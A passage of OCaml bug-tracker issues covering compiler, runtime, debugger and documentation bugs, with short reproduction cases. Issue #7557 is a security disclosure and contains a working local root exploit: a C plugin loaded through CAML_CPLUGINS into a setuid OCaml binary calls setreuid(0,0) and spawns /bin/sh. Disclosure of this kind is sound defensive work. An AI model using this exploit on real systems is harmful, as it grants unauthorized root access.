@alainfrisch\n**Status:** resolved (set by @alainfrisch on 2017-07-18T22:05:42Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Fixed in version:** 4.06.0 +dev/beta1/beta2/rc1\n**Category:** platform support (windows, cross-compilation, etc)\n\n## Bug description\n\nIt appears that the target of native Windows symlinks (as created by Unix.symlink under Windows) *must* necessarily use backward slashes.  Otherwise the native Windows APIs will think that the target does not exist.\r\n\r\nAs a compatibility layer, Unix.symlink should allow forward slashes in its argument.\n\n## Steps to reproduce\n\n<pre>\r\n$ cd /tmp\r\n$ ocaml unix.cma\r\n# Unix.mkdir \"foo\" 0o777;;\r\n- : unit = ()\r\n# close_out (open_out \"foo/test.txt\");;\r\n- : unit = ()\r\n# Unix.symlink \"foo/test.txt\" \"foolink\";;\r\n- : unit = ()\r\n# Unix.stat \"foolink\";;\r\nException: Unix.Unix_error (Unix.ENOENT, \"stat\", \"foolink\").\r\n# Unix.symlink \"foo\\\\test.txt\" \"foolink2\";;\r\n- : unit = ()\r\n# Unix.stat \"foolink2\";;\r\n- : Unix.stats =\r\n{Unix.st_dev = -427248956; st_ino = 2456; st_kind = Unix.S_REG;\r\n st_perm = 438; st_nlink = 1; st_uid = 0; st_gid = 0; st_rdev = -427248956;\r\n st_size = 0; st_atime = 1498204751.3015687; st_mtime = 1498204751.3015687;\r\n st_ctime = 1498204751.3015687}\r\n</pre>\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7563\n**Reporter:** fahndrich\n**Assigned to:** @gasche\n**Status:** resolved (set by @gasche on 2017-06-26T15:21:01Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** major\n**Platform:** x86\n**OS:** Linux\n**OS Version:** Linux-gnu Centos\n**Version:** 4.03.0\n**Fixed in version:** 4.06.0 +dev/beta1/beta2/rc1\n**Category:** middle end (typedtree to clambda)\n**Monitored by:** @gasche\n\n## Bug description\n\nA reference from a module A to B picks up B.C (a module value) instead of B.C an extensible variant tag.\r\n\r\nThis results in a block with tag 0 containing the module values being passed around instead of an extensible variant value.\r\n\r\nRepro is attached.\n\n## Steps to reproduce\n\nocamlopt a_module.ml debug.ml variant.ml repro.ml -o repro\r\n./repro\r\n\r\nPrints:\r\nStored: a Clash\r\nDirect: unknown: tag: 0, Size 3\r\n  0: An int 0\r\n  1: tag: 247, Size 2\r\n    0: <unknown with tag 1001>\r\n    1: An int 1\r\n  2: tag: 247, Size 2\r\n    0: <unknown with tag 1001>\r\n    1: An int 1\r\nFatal error: exception Invalid_argument(\"compare: functional value\")\r\n\r\nThe first print is getting the right variant value by accessing it via another name.\r\nThe second print is getting the wrong module value and I added some debug output to show the contents. As you can see the contents corresponds to the a_module contents (an int (empty list), and 2 closures).\r\n\r\nThe fatal error is trying to compare the ill-bound variant tag (which is really a module) and causing comparison of closures.\n\n## Additional information\n\nTested on 4.02.3, 4.03.0, 4.04.1, and 4.06.0+trunk and it fails in all cases.\r\n\r\n(My category above is just a guess, middle end)\n\n## File attachments\n\n- [repro.tgz](https://gist.githubusercontent.com/vicuna/10efbd2560d717c3e1500cc9b6075f76/raw/2a9cb01f73d93d8c73747e86192543c846dc2e50/repro.tgz)\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7562\n**Reporter:** rgdoliveira\n**Status:** acknowledged (set by @xavierleroy on 2017-06-22T18:03:14Z)\n**Resolution:** open\n**Priority:** normal\n**Severity:** crash\n**Platform:** ppc64le\n**OS:** Alpine Linux\n**OS Version:** 3.6.2\n**Version:** 4.04.1\n**Category:** back end (clambda to assembly)\n**Related to:** #7697\n**Monitored by:** @nojb @gasche @dbuenzli\n\n## Bug description\n\nI'm building ocaml in Alpine Linux ppc64le and it builds fine. But when I try to use ocamlc, I'm getting a segfault.\r\n\r\nGdb backtrace shows:\r\n\r\n#0  0x00003fffb7fad710 in do_relocs (dso=0x3fffb7ff26a0 <app>, rel=0x200ab4b8, rel_size=2495088, \r\n    stride=3) at ldso/dynlink.c:379\r\n#1  0x00003fffb7fae1ec in reloc_all (p=0x3fffb7ff26a0 <app>) at ldso/dynlink.c:1195\r\n#2  0x00003fffb7fafc94 in __dls3 (sp=<optimized out>) at ldso/dynlink.c:1638\r\n#3  0x00003fffb7faf3d4 in __dls2 (base=<optimized out>, sp=0x3ffffffffba0) at ldso/dynlink.c:1424\r\n#4  0x00003fffb7facd2c in _dlstart_c (sp=<optimized out>, dynv=<optimized out>)\r\n    at ldso/dlstart.c:147\r\n#5  0x00003fffb7fb1104 in _dlstart () from /lib/ld-musl-powerpc64le.so.1\r\n\r\nI know that ocaml was recently ported to ppc64le architecture and works fine with glic, but seems there is an issue with musl.\n\n## Steps to reproduce\n\nThe steps bellow need to be done inside an Alpine ppc64le:\r\n\r\n- Clone aports repository\r\n  $ git clone https://github.com/alpinelinux/aports.git\r\n\r\n- Build ocaml package\r\n  $ cd aports/community/ocaml\r\n  $ abuild -r\r\n\r\n- Install the built package:\r\n  $ sudo apk add <ocaml_apk>\r\n\r\n- Run ocamlc to get the segmentation fault.\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7561\n**Reporter:** @nojb\n**Status:** resolved (set by @xavierleroy on 2017-06-22T18:06:23Z)\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** otherlibs\n**Monitored by:** @dbuenzli\n\n## Bug description\n\nI found the following puzzling behaviour while working on https://github.com/ocaml/ocaml/pull/1200.\r\n\r\nUnix.open_process_full seems to have problems with with UTF-8 characters in the \"env\" parameter. See steps to reproduce below.\r\n\r\n- When passing ASCII characters it works fine.\r\n\r\n- Using the Unix.execve call (rather than Unix.open_process_full) seems to work fine.\r\n\r\n- It also works fine on Windows (where a different implementation is used).\r\n\r\n- I tried it with trunk and 4.05.\n\n## Steps to reproduce\n\nPut the following in printenv.c:\r\n\r\n<pre>\r\n#include <stdio.h>\r\n\r\nint main(int argc, char ** argv, char ** envp)\r\n{\r\n  int i = 0;\r\n  while (envp[i]) printf(\"%s\\n\", envp[i++]);\r\n  return 0;\r\n}\r\n</pre>\r\n\r\nand in test.ml:\r\n\r\n<pre>\r\nlet envp = [|\r\n  \"e?te?=????????\";\r\n  \"simple=??\";\r\n  \"sÅur=????\";\r\n  \"??=????\";\r\n|]\r\n\r\nlet () =\r\n  let (ic, _, _) as proc = Unix.open_process_full \"./printenv.exe\" envp in\r\n  let rec loop () =\r\n    match input_line ic with\r\n    | s -> s :: loop ()\r\n    | exception End_of_file -> []\r\n  in\r\n  List.iter print_endline (loop ());\r\n  ignore (Unix.close_process_full proc)\r\n</pre>\r\n\r\nCompile & run by doing\r\n\r\n<pre>\r\ngcc printenv.c -o printenv.exe\r\nocaml unix.cma test.ml\r\n</pre>\r\n\r\nIn my machine I see only the second line of envp and PWD as output.\n\n## File attachments\n\n- [test.ml](https://gist.githubusercontent.com/vicuna/13e4f330f349a7cf407e41e5e7c29d1a/raw/4037309b74d0263cd7da65e25fba552306510206/test.ml)\n"},{"labels":["bug",null,null],"text":"**Original bug ID:** 7557\n**Reporter:** emilliken\n**Assigned to:** @damiendoligez\n**Status:** resolved (set by @damiendoligez on 2017-06-23T15:19:47Z)\n**Resolution:** fixed\n**Priority:** urgent\n**Severity:** major\n**OS:** *nix\n**Version:** 4.04.0\n**Target version:** 4.04.2\n**Fixed in version:** 4.04.2\n**Category:** runtime system and C interface\n**Monitored by:** @gasche\n\n## Bug description\n\nI've marked this issue as private.\r\n\r\nBy default, it seems the environment variables CAML_CPLUGINS, CAML_NATIVE_CPLUGINS, and CAML_BYTE_CPLUGINS can be used to auto-load code into any executable produced with ocamlopt or ocamlc.  This can lead to privilege escalation if the binary is marked setuid.\n\n## Steps to reproduce\n\nTo demonstrate, as root, do:\r\n\r\n# cat > hello.ml << EOF\r\nlet _ =\r\n  print_endline \"hello, world\"\r\nEOF\r\n# ocamlopt -o hello hello.ml\r\n# chmod +s hello\r\n\r\nAs an unprivileged user, do:\r\n\r\n$ cat > exp.c << EOF\r\n#include <stdio.h>\r\n#include <sys/types.h>\r\n#include <unistd.h>\r\n\r\nvoid caml_cplugin_init() {\r\n    printf(\"IN PLUGIN\\n\");\r\n    setreuid(0,0);\r\n    execl(\"/bin/sh\", \"sh\", NULL);\r\n}\r\nEOF\r\n$ gcc -shared -fPIC -o exp.so exp.c\r\n$ id\r\nuid=1002(user) gid=1002(user) groups=1002(user)\r\n$ CAML_CPLUGINS=./exp.so ./hello\r\nIN PLUGIN\r\n# id\r\nuid=0(root) gid=1002(user) egid=0(root) groups=0(root),1002(user)\n\n## Additional information\n\nIt sounds like the fix involves making sure that the effective uid matches the real uid before loading any plugins.  Code is in byterun/sys.c\n\n## File attachments\n\n- [0001-make-CPLUGINS-into-a-runtime-variant-plug-compiled-a.patch](https://gist.githubusercontent.com/vicuna/0cdfd45bd3173eb467574e0d37e25f6e/raw/b077d33732c331caaf411f31c62e0d5d24a83257/0001-make-CPLUGINS-into-a-runtime-variant-plug-compiled-a.patch)\n- [0002-add-Sys.secure_getenv.patch](https://gist.githubusercontent.com/vicuna/0cdfd45bd3173eb467574e0d37e25f6e/raw/fb1ee1a6f8444fca74ede3d69db460f666ec7975/0002-add-Sys.secure_getenv.patch)\n- [0003-replace-getenv-with-secure_getenv-where-appropriate.patch](https://gist.githubusercontent.com/vicuna/0cdfd45bd3173eb467574e0d37e25f6e/raw/bac95c41e863183e773a09b20610bb4a11b3ba6a/0003-replace-getenv-with-secure_getenv-where-appropriate.patch)\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7556\n**Reporter:** berenger\n**Assigned to:** @gasche\n**Status:** resolved (set by @gasche on 2017-07-04T00:59:12Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Platform:** linux\n**Fixed in version:** 4.05.0 +dev/beta1/beta2/beta3/rc1\n**Category:** standard library\n\n## Bug description\n\n# file ~/.opam/4.04.1/lib/ocaml/list.cmt\r\n/home/berenger/.opam/4.04.1/lib/ocaml/list.cmt: data\r\n# file ~/.opam/4.04.1/lib/ocaml/list.cmti\r\n/home/berenger/.opam/4.04.1/lib/ocaml/list.cmti: OCaml interface file (.cmi) (Version 021)\r\nberenger@aspirin:~# file ~/.opam/4.04.1/lib/ocaml/unix.cmt\r\n/home/berenger/.opam/4.04.1/lib/ocaml/unix.cmt: cannot open `/home/berenger/.opam/4.04.1/lib/ocaml/unix.cmt' (No such file or directory)\r\nberenger@aspirin:~# file ~/.opam/4.04.1/lib/ocaml/unix.cmti\r\n/home/berenger/.opam/4.04.1/lib/ocaml/unix.cmti: cannot open `/home/berenger/.opam/4.04.1/lib/ocaml/unix.cmti' (No such file or directory)\r\n opam switch | grep C\r\n4.04.1  C 4.04.1  Official 4.04.1 release\n\n## Steps to reproduce\n\ncf. above\n\n## Additional information\n\nThis prevents some tools (like ocp-browser) from being able to look-up into the documentation for this module.\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7555\n**Reporter:** @ivg\n**Status:** resolved (set by @xavierleroy on 2017-06-13T09:28:49Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**OS:** MacOS\n**OS Version:** 10.11\n**Version:** 4.03.0\n**Fixed in version:** 4.04.1\n**Category:** toplevel\n\n## Bug description\n\nThe Ephemeron module neither can be used in the toplevel nor be loaded into it. Since Ephemeron is a part of the stdlib.cma archive I would assume, that it should work without any action from a user, especially, since no cma or cmo file is shipped with the compiler, that will allow us to enable the Ephemeron module explicitly in the toplevel with the load directive.\n\n## Steps to reproduce\n\n$ ocaml\r\n        OCaml version 4.03.0\r\n\r\n# #show Ephemeron.K1.create;;\r\nval create : unit -> ('k, 'd) Ephemeron.K1.t\r\n# Ephemeron.K1.create;;\r\nError: Reference to undefined global `Ephemeron'\r\n# \r\n\r\n(* OCaml 4.04.0 manifests the same behavior *)\n\n## Additional information\n\nA workaround is to load the stdlib.cma archive explicitly, either with the load directive or by passing it as an object to the toplevel, e.g.,\r\n\r\n    ocaml stdlib.cma\r\n\r\nI've tried to figure out how top-level loads the code, and apparently it automatically loads all modules, that are imported, and since Ephemeron is not used in any of the toplevel libraries it is not loaded. A possible workaround would be to add a bogus module E = Ephemeron to the toploop.ml, but this sound awkwardly wrong.\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7554\n**Reporter:** nbb\n**Assigned to:** @trefis\n**Status:** resolved (set by @gasche on 2018-07-19T15:40:38Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Platform:** x86_64\n**OS:** MacOs\n**OS Version:** 12.5\n**Version:** 4.04.1\n**Fixed in version:** 4.08.0+dev/beta1/beta2\n**Category:** tools (ocaml{lex,yacc,dep,debug,...})\n**Monitored by:** @nojb @gasche @hcarty\n\n## Bug description\n\nconsider this snippet:\r\n\r\n<pre>let n, nstop, nex = List.(length resokerr, length lims, length exceptions) in\r\nPrintf.printf \"%d stopped iterations (%.0f%%)\\n\"\r\n    nstop (float_of_int nstop /. float_of_int n *. 100.);\r\n</pre>\r\n\r\nwhen stepping into the printf line with ocamldebug, neither of n, nstop, nex can be printed.\n\n## Steps to reproduce\n\nassign identifiers in tuple form. then try to print while they are in scope.\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7553\n**Reporter:** @dra27\n**Assigned to:** @lpw25\n**Status:** resolved (set by @alainfrisch on 2017-10-10T09:31:26Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** tweak\n**Version:** 4.05.0 +dev/beta1/beta2/beta3/rc1\n**Target version:** 4.06.0 +dev/beta1/beta2/rc1\n**Fixed in version:** 4.06.0 +dev/beta1/beta2/rc1\n**Category:** typing\n\n## Bug description\n\njbuilder recommends a recursive module pattern to allow the content of an .mli file to be turned into an equivalent .ml file, but this appears to have unearthed a bug in Warning 33.\n\n## Steps to reproduce\n\nCreate a.mli containing\r\n<pre>\r\ntype foo = Foo\r\n</pre>\r\nand b.mli containing\r\n<pre>\r\nopen A\r\ntype bar = Bar of foo\r\n</pre>\r\nthen create b.ml to be\r\n<pre>\r\nmodule rec B : sig\r\n  open A                 (* i.e. the contents of b.mli *)\r\n  type bar = Bar of foo\r\nend = B\r\ninclude B\r\n</pre>\r\n\r\nWhen compiled, Warning 33 is incorrectly emitted:\r\n<pre>\r\n$ ocamlc -w +a a.mli b.mli b.ml\r\nFile \"b.ml\", line 2, characters 2-8:\r\n\r\nWarning 33: unused open A.\r\n</pre>\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7552\n**Reporter:** @lpw25\n**Status:** resolved (set by @xavierleroy on 2017-09-30T16:06:49Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.04.1\n**Fixed in version:** 4.06.0 +dev/beta1/beta2/rc1\n**Category:** middle end (typedtree to clambda)\n**Monitored by:** @gasche\n\n## Bug description\n\nThe following program will segfault:\r\n\r\n  module Alias = struct module Bigarray = Bigarray end\r\n\r\n  module Bigarray : sig\r\n\r\n    type int_elt\r\n\r\n    val x : (float, int_elt, Bigarray.c_layout) Bigarray.Array1.t\r\n\r\n  end = struct\r\n\r\n    type int_elt = Bigarray.float32_elt\r\n\r\n    let x = Bigarray.Array1.create Bigarray.Float32 Bigarray.C_layout 2\r\n\r\n  end\r\n\r\n  let x = Bigarray.x\r\n\r\n  open Alias\r\n\r\n  let f = x.{0}\r\n\r\n  let () = Printf.printf \"%f\\n%!\" f\r\n\r\nThe issue is that typeopt.ml assumes that the [int_elt] type from the [Bigarray] submodule is the same as the normal [Bigarray.int_elt] and so incorrectly optimises the array access.\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7545\n**Reporter:** @chambart\n**Assigned to:** @chambart\n**Status:** assigned (set by @chambart on 2017-06-02T10:26:41Z)\n**Resolution:** open\n**Priority:** low\n**Severity:** minor\n**Category:** middle end (typedtree to clambda)\n**Monitored by:** @gasche\n\n## Bug description\n\nOn a function like\r\n\r\nlet f = fun x -> ((fun y -> fun z -> x + y + z) [@inline])\r\n\r\nAs the function is turned into an arity 3 one, the attribute does not apply to any function in lambda. The solution should probably be just to simply warn in that situation.\n"},{"labels":["bug",null,null],"text":"**Original bug ID:** 7543\n**Reporter:** @jberdine\n**Assigned to:** @Octachron\n**Status:** resolved (set by @mshinwell on 2017-06-09T17:03:19Z)\n**Resolution:** duplicate\n**Priority:** normal\n**Severity:** crash\n**Version:** 4.04.1\n**Category:** typing\n\n## Bug description\n\nIt seems that ill-typed code can cause -short-paths to raise instead of detecting the error.\n\n## Steps to reproduce\n\n```\r\n$ cat repro.ml\r\nopen Base\r\n\r\nlet e = Set.empty (module Comparator.Poly)\r\n$ ocamlc -I ~/.opam/4.04.1/lib/base repro.ml\r\nFile \"repro.ml\", line 3, characters 26-41:\r\nError: Signature mismatch:\r\n       ...\r\n       Type declarations do not match:\r\n         type 'a t = 'a\r\n       is not included in\r\n         type t = Base.Comparator.Poly.t\r\n       They have different arities.\r\n$ ocamlc -I ~/.opam/4.04.1/lib/base repro.ml -short-paths\r\nFatal error: exception Failure(\"nth\")\r\n$ OCAMLRUNPARAM=b ocamlc -I ~/.opam/4.04.1/lib/base repro.ml -short-paths\r\nFatal error: exception Failure(\"nth\")\r\nRaised at file \"pervasives.ml\", line 32, characters 17-33\r\nCalled from file \"typing/printtyp.ml\", line 235, characters 15-30\r\nCalled from file \"typing/printtyp.ml\", line 489, characters 43-62\r\nCalled from file \"typing/printtyp.ml\", line 803, characters 8-21\r\nCalled from file \"typing/printtyp.ml\", line 905, characters 13-38\r\nCalled from file \"typing/printtyp.ml\", line 908, characters 27-72\r\nCalled from file \"format.ml\", line 1187, characters 4-20\r\nCalled from file \"format.ml\", line 1200, characters 32-48\r\nCalled from file \"format.ml\", line 1200, characters 32-48\r\nCalled from file \"format.ml\", line 1187, characters 4-20\r\nCalled from file \"format.ml\", line 1248, characters 20-38\r\nCalled from file \"typing/includemod.ml\", line 529, characters 6-343\r\nCalled from file \"format.ml\", line 1187, characters 4-20\r\nCalled from file \"format.ml\", line 1248, characters 20-38\r\nCalled from file \"utils/misc.ml\", line 28, characters 20-27\r\nRe-raised at file \"utils/misc.ml\", line 28, characters 50-57\r\nCalled from file \"utils/misc.ml\", line 40, characters 10-14\r\nRe-raised at file \"utils/misc.ml\", line 42, characters 38-45\r\nCalled from file \"format.ml\", line 1187, characters 4-20\r\nCalled from file \"format.ml\", line 1248, characters 20-38\r\nCalled from file \"format.ml\", line 1187, characters 4-20\r\nCalled from file \"format.ml\", line 1248, characters 20-38\r\nCalled from file \"utils/misc.ml\", line 28, characters 20-27\r\nRe-raised at file \"utils/misc.ml\", line 28, characters 50-57\r\nCalled from file \"utils/misc.ml\", line 40, characters 10-14\r\nRe-raised at file \"utils/misc.ml\", line 42, characters 38-45\r\nCalled from file \"format.ml\", line 1187, characters 4-20\r\nCalled from file \"format.ml\", line 1248, characters 20-38\r\nCalled from file \"parsing/location.ml\" (inlined), line 415, characters 2-28\r\nCalled from file \"typing/typemod.ml\", line 1830, characters 13-67\r\nCalled from file \"parsing/location.ml\", line 384, characters 14-19\r\nCalled from file \"parsing/location.ml\", line 447, characters 12-28\r\nRe-raised at file \"parsing/location.ml\", line 450, characters 12-23\r\nRe-raised at file \"parsing/location.ml\", line 450, characters 12-23\r\nRe-raised at file \"parsing/location.ml\", line 450, characters 12-23\r\nRe-raised at file \"parsing/location.ml\", line 450, characters 12-23\r\nRe-raised at file \"parsing/location.ml\", line 450, characters 12-23\r\nCalled from file \"parsing/location.ml\" (inlined), line 454, characters 31-61\r\nCalled from file \"driver/main.ml\", line 190, characters 4-35\r\nCalled from file \"utils/timings.ml\", line 69, characters 10-13\r\nCalled from file \"driver/main.ml\", line 194, characters 2-28\r\n$\r\n```\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7542\n**Reporter:** toots\n**Assigned to:** @gasche\n**Status:** resolved (set by @gasche on 2017-05-28T15:11:58Z)\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** documentation\n\n## Bug description\n\nI was looking for the latest released version of the compiler/language and found out that:\r\n- ocaml.org references a really old 4.01 release\r\n- caml.inria.fr stops at 4.03\r\n\r\nThe only way to find a clear information was through the github release page, which listed, I believe, 4.04.1 as the latest stable release, a month and a half ago.\r\n\r\nPerhaps it's time to clean all of this and have a single, canonical entry point to list OCaml releases?\n"},{"labels":[null,null,"bug"],"text":"**Original bug ID:** 7541\n**Reporter:** @gasche\n**Assigned to:** @chambart\n**Status:** feedback (set by @chambart on 2017-06-01T16:34:02Z)\n**Resolution:** open\n**Priority:** low\n**Severity:** tweak\n**Version:** 4.04.1\n**Category:** back end (clambda to assembly)\n**Monitored by:** @ygrek\n\n## Bug description\n\nConsider:\r\n\r\n  let f (x, y) = ignore (x + y)\r\n  [@@inline never]\r\n\r\n  let () = for i = 1 to N do\r\n    f (1, 2);\r\n  done\r\n\r\n  let () = for i = 1 to N do\r\n    f (i, 3);\r\n  done\r\n\r\nYou would expect the first loop, calling the functions with statically-known arguments, to be as fast or faster as the second one, calling the function with a non-statically-known argument. With the non-flambda backend, the reverse happens: the second loop is sensibly faster than the first one. For one choice of N it runs in 1.19s instead of 1.59s on my machine -- so the first loop is 33% slower.\r\n\r\nMy understanding is that the constant tuple (1, 2) is turned into a module-global constant, which prevents the optimizer from doing the arity-raising optimization on the static call to f.\r\n\r\nAll non-flambda OCaml versions I have tested are affected, but flambda correctly optimizes this code. I don't know if this has a performance impact, so I only marked this as a \"tweak\" bug, but I found it surprising so I created a ticket to preserve the information.\n\n## Steps to reproduce\n\nlet rec f (x, y) = ignore (x + y)\r\n[@@inline never]\r\n\r\nlet () =\r\n  let static_total = ref 0. in\r\n  let dynamic_total = ref 0. in\r\n  for i = 1 to 50 do\r\n    let start_static = Unix.gettimeofday () in\r\n    for _j = 1 to 10_000_000 do\r\n      f (1, 2);\r\n    done;\r\n    let stop_static = Unix.gettimeofday () in\r\n    static_total := !static_total +. (stop_static -. start_static);\r\n    let start_dynamic = Unix.gettimeofday () in\r\n    for j = 1 to 10_000_000 do\r\n      f (j, 2);\r\n    done;\r\n    let stop_dynamic = Unix.gettimeofday () in\r\n    dynamic_total := !dynamic_total +. (stop_dynamic -. start_dynamic);\r\n  done;\r\n  Printf.printf \"%f: static total\\n%f: dynamic total\\n%!\"\r\n    !static_total !dynamic_total\n"},{"labels":[null,"bug",null,null],"text":"**Original bug ID:** 7540\n**Reporter:** herbelin\n**Status:** acknowledged (set by @xavierleroy on 2017-10-10T12:29:17Z)\n**Resolution:** open\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.04.1\n**Category:** tools (ocaml{lex,yacc,dep,debug,...})\n\n## Bug description\n\n[ Original summary was: Packed modules: setting \"break\" broken in ocamldebug + miscommunication emacs/ocamldebug.  First issue is solved. ]\r\n\r\nThere seems to be a bug with ocamldebug on packed modules. In the reproducible script below, the first \"break\" works but the second gives \"Can't find any event there\". Note however that executing step by step works well.\r\n\r\nThis seems related to the call to \"Hashtbl.add all_events_by_module md sorted_evl\" in Symbols.read_symbols which binds all modules of a pack to the name of the first module.\r\n\r\nThere is also a communication bug when calling ocamldebug from emacs (at least using tuareg). Commands of the form `break @ \"b\" # 10` are sent while ocamldebug tolerance is only about adding .ml or uncapitalizing the first letter of a (possibly qualified) module name.\n\n## Steps to reproduce\n\necho \"let f x = x\" > a.ml\r\necho \"open A;; f 1\" > b.ml\r\nocamlc -g -c a.ml b.ml\r\nocamlc -g -pack -o p.cmo a.cmo b.cmo\r\nocamlc -g -o a.out p.cmo\r\nocamldebug a.out\r\nbreak @ B.P # 10\r\nbreak @ A.P # 9\n\n## Additional information\n\nSince I already tried a fix for testing, I shall try to submit it to the PR system in case it can ever save time.\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7539\n**Reporter:** prevosto\n**Assigned to:** @Octachron\n**Status:** resolved (set by @Octachron on 2017-05-24T18:41:02Z)\n**Resolution:** fixed\n**Priority:** low\n**Severity:** minor\n**Version:** 4.04.0\n**Fixed in version:** 4.05.0 +dev/beta1/beta2/beta3/rc1\n**Category:** documentation\n\n## Bug description\n\nthe page\r\nhttp://caml.inria.fr/pub/docs/manual-ocaml/ocamldoc.html\r\n\r\nprovides links to ocamldoc's sources in its section on custom generators, such as e.g. http://caml.inria.fr/cgi-bin/viewvc.cgi/ocaml/version/4.04/ocamldoc/odoc_html.ml?view=markup. These links are dead. They should probably be updated to something like https://github.com/ocaml/ocaml/blob/4.04/ocamldoc/odoc_html.ml\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7538\n**Reporter:** talex\n**Assigned to:** @mshinwell\n**Status:** assigned (set by @mshinwell on 2017-05-23T13:46:02Z)\n**Resolution:** open\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.04.1\n**Category:** middle end (typedtree to clambda)\n\n## Bug description\n\nWhen building a project with @inlined annotations using jbuilder, OCaml complains that 'the \"inlined\" attribute cannot appear in this context'. Turning off \"wrapped\" mode made the warning go away. It looks like @inlined doesn't work with module aliases.\n\n## Steps to reproduce\n\n(simplified by lpw25)\r\n\r\nmodule M = Map.Make[@inlined](String);;\r\n\r\nworks, but:\r\n\r\nmodule N = Map\r\nmodule M = N.Make[@inlined](String);;\r\n\r\ngives:\r\n\r\nWarning 53: the \"inlined\" attribute cannot appear in this context\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7537\n**Reporter:** @stedolan\n**Status:** resolved (set by @xavierleroy on 2017-10-15T14:35:04Z)\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** runtime system and C interface\n**Monitored by:** @gasche @ygrek\n\n## Bug description\n\nHashtbl.hash hashes the contents of closures, including their code pointers:\r\n\r\n    # Hashtbl.hash (fun x -> x);;\r\n    - : int = 710785908\r\n    # Hashtbl.hash (fun x -> x);;\r\n    - : int = 168456855\r\n\r\nPervasives.compare does not throw an exception on function values which are physically equal:\r\n\r\n    # let id x = x;; \r\n    val id : 'a -> 'a = <fun>\r\n    # compare id id;;\r\n    - : int = 0\r\n\r\nThis makes hashtables act strangely:\r\n\r\n    # let h = Hashtbl.create 20;;\r\n    val h : ('_a, '_b) Hashtbl.t = <abstr>\r\n    # Hashtbl.add h id 42;;\r\n    - : unit = ()\r\n    # Hashtbl.find h id;;\r\n    - : int = 42\r\n    # Hashtbl.find h (fun x -> x);;\r\n    Exception: Not_found.\r\n    # Hashtbl.add h (fun x -> x) 10;;\r\n    - : unit = ()\r\n    # Hashtbl.find h id;;\r\n    - : int = 42\r\n    # Hashtbl.find h (fun x -> x);;\r\n    Exception: Not_found.\r\n\r\nIn particular, the result of Hashtbl.find will depend on whether the optimiser combines the different 'fun x -> x' values. The bytecode toplevel, shown here, does not.\r\n\r\nFuther, Hashtbl.find can sometimes raise Invalid_argument, again at the mercy of the optimiser:\r\n\r\n    # let add a b = a + b;;\r\n    val add : int -> int -> int = <fun>\r\n    # let f1 = add 1;;\r\n    val f1 : int -> int = <fun>\r\n    # let f2 = add 1;;\r\n    val f2 : int -> int = <fun>\r\n    # Hashtbl.hash f1;;      \r\n    - : int = 881405119\r\n    # Hashtbl.hash f2;;\r\n    - : int = 881405119\r\n    # Hashtbl.add h f1 10;;\r\n    - : unit = ()\r\n    # Hashtbl.find h f2;;\r\n    Exception: Invalid_argument \"compare: functional value\".\n"},{"labels":[null,"bug",null],"text":"**Original bug ID:** 7533\n**Reporter:** jmi\n**Assigned to:** @mshinwell\n**Status:** resolved (set by @mshinwell on 2017-05-15T08:34:58Z)\n**Resolution:** duplicate\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.04.1\n**Category:** back end (clambda to assembly)\n**Related to:** #7531\n**Monitored by:** @yallop\n\n## Bug description\n\nConsider the examples\r\n\r\n  (int_of_string \"\") / (let e = let w = false in () in 0)\r\n  (int_of_string \"\") / (List.hd [0])\r\n\r\nAt runtime the dividend throws an exception and the divisor evaluates to 0.\r\nUnder call-by-value, I expect the dividend to be evaluated before attempting a division. This agrees with the bytecode backend's output:\r\n\r\n  Fatal error: exception Failure(\"int_of_string\")\r\n\r\nHowever with the native code backend I get:\r\n\r\n  Fatal error: exception Division_by_zero\r\n\r\nthereby removing the effect of the dividend.\r\n\r\n\r\nI believe the problem is in asmcomp/cmmgen.ml, line 410-414,\r\nwhen the divisor is sufficiently complex to not hit (or get constant folded to hit) the earlier cases:\r\n\r\n  | (c1, c2) ->\r\n        bind \"divisor\" c2 (fun c2 ->\r\n          Cifthenelse(c2,\r\n                      Cop(Cdivi, [c1; c2], dbg),\r\n                      raise_symbol dbg \"caml_exn_Division_by_zero\"))\r\n\r\nNote how c1 never gets evaluated when we branch on the result of c2 and it is 0.\r\n\r\n\r\n\r\nThere is a similar problem with 'mod' (replacing '/' with 'mod' in the examples):\r\n\r\n  (int_of_string \"\") mod (let e = let w = false in () in 0)\r\n  (int_of_string \"\") mod (List.hd [0])\r\n\r\nand the code generation case for mod in asmcomp/cmmgen.ml, line 446-450.\r\n\r\n\r\nThis is confirmed and reproducable on version 4.04.1 under Debian and 4.04.0 under OSX. \r\n\r\n\r\nNote, these two issues are different from #7201 (fixed in #954) which concerned how the native code backend removed a Division_by_zero in the 0 / e and 0 mod e cases.\n\n## Steps to reproduce\n\n$ echo '(int_of_string \"\") / (let e = let w = false in () in 0)' > div.ml\r\n$ ocamlopt -o div.native div.ml\r\n$ ocamlc -o div.byte div.ml\r\n$ ./div.native \r\nFatal error: exception Division_by_zero\r\n$ ./div.byte \r\nFatal error: exception Failure(\"int_of_string\")\r\n\r\n$ echo '(int_of_string \"\") mod (let e = let w = false in () in 0)' > mod.ml\r\n$ ocamlopt -o mod.native mod.ml\r\n$ ocamlc -o mod.byte mod.ml\r\n$ ./mod.native \r\nFatal error: exception Division_by_zero\r\n$ ./mod.byte \r\nFatal error: exception 